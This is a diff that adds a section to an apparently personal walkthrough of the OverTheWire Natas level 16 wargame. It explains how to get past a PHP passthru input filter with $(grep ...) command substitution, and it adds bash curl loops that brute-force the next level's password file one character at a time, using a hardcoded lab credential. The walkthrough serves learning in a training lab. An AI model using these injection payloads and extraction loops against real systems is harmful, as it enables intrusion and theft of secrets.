@@ -411,3 +411,93 @@ done
 ```
 
 (it's LIKE BINARY instead of LIKE because it makes a stronger distinguishment between capital and lower case, but details...)
+
+
+## :::: More Vulnerabilities ::::
+
+php has a function passthru which just hands the code off to shell scripting, meaning bash commands can be potentially used. A relevant example is this "searching for a match in a dictionary". Here's the relevant php:
+```php
+if($key != "") {
+   if(preg_match('/[;|&`\'"]/',$key)) {
+     print "Input contains an illegal character!";
+   } else {
+     passthru("grep -i \"$key\" dictionary.txt");
+   }
+}
+```
+So the characters: `; | & \` ' "` are not allowed and input is most definitely put into a quoted string `grep -i "input" dictionary.txt`. I really tied playing with special characters like $, @ etc. But in the end nothing would work. I couldn't write to anything and view it. It turns out the key is the key `if $key ~=""`. So if there's an actual key, check it against the dictionary. I tested locally. I can cat a file. If I have a file called `passwd` and it contains something like `abc` as its content, plus a random dictionary.txt file with anything else, this command: `grep -i "$(grep a ./passwd)" dictionary.txt` (i.e. I'm checking for an existing character), nothing is returned. It's a little confusing, but I suppose I get at this point a "valid empty string". So the condition `if $key != ""` is not met and nothing is returned.
+
+On the flip side, searching for a character that doesn't exist: `grep -i "$(grep Z ./passwd)" dictionary.txt`. So at this point the key isn't nothing (though it still gets passed through and the command that's "seen" is effectivly `grep -i "" dictionary.txt` which just displays the entire file's contents.
+
+So all in all, I know if I guess a character in the file, I get nothing returned and if I guess wrong, I get a long output (the entire file concatenated). If this is done as a curl command, I get about 30 lines of short HTML for a currect guess and a long full list + the short HTML, abut 50,000 lines
+
+As seems to be the theme as of recently, I didn't fully get this myself. Glanced at another solution, saw it looked like a brute force and I worked out the rest myself.
+
+```bash
+#PART 1 -- find restricted character set
+for c in {A..Z} {a..z} {0..9}
+do
+      curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+'$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
+      -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output.txt
+
+      if [[ $(cat output.txt | wc -l) -lt 300 ]]
+              then echo "found element $c"
+      fi
+done
+
+```
+
+```bash
+char_set="A G H N P Q S W b c d g h k m n q r s w 0 3 5 7 8 9"
+
+for s in $char_set
+do
+        array=$s
+        change=1
+        while [ $change == 1 ]
+        do
+                change=0
+                for c in $char_set
+                do
+                        curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+'$array$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
+                        -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output.txt
+
+                        if [[ $(cat output.txt | wc -l) -lt 300 ]]
+                                then echo "found pattern: $array$c"
+                                array=$array$c
+                                change=1
+                                break
+                        fi
+                done
+         done
+done
+```
+That takes 3+ hours. Here's a faster variation (only ~15 mins, it checks that the pattern is sound from the beginning and doesn't wild goose chase other portions of the pattern `grep ^<pattern> dictionary.txt`):
+
+```bash
+char_set="A G H N P Q S W b c d g h k m n q r s w 0 3 5 7 8 9"
+
+for s in $char_set
+do
+        array=$s
+        change=1
+        echo "on $s"
+        while [ $change == 1 ]
+        do
+                change=0
+                for c in $char_set
+                do
+                        echo "trying $array$c"
+                        curl -s 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E'$array$c'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' \
+                        -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' > output2.txt
+
+                        if [[ $(cat output2.txt | wc -l) -lt 300 ]]
+                                then echo "found pattern: $array$c"
+                                array=$array$c
+                                change=1
+                                break
+                        fi
+                done
+        done
+done
+```
